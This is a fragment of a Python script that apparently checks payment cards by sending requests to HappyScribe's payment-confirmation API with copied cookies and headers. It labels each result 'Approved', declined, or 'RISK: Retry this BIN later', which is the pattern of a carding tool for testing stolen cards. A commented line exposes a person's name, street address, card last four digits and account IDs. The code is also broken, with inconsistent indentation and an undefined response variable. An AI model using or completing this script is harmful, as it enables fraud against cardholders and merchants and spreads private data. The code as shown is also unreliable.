    'extra_plan_hours': None,
}

	req = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"id":10486458,"address":"9350 N Central Expy","name":"yusuf","country":"US","vat":null,"billing_account_id":10486458,"last4":"9305","orderReference":"nljannd","user_id":11296645,"organization_id":10807386,"hours":0,"balance_increase_in_cents":null,"payment_method_id":"pm_1PLSN5KEzvleW5flaDzdyat6","transcription_id":null,"plan":"pro_2023_05_01","order_id":null,"recurrence_interval":"month","extra_plan_hours":null}'
#response = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, data=data)
	
	text = response.text
		
	pattern = r'Status code (.*?)\s*</li>'
		
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
	
	if 'Success' in result or 'successfully' in result or 'thank you' in result or 'thanks' in result or 'approved' in result or 'fund' in result:
			return 'Approved'
	else:
		return result
def sq(card):
	return 'Your card was declined.'
	
	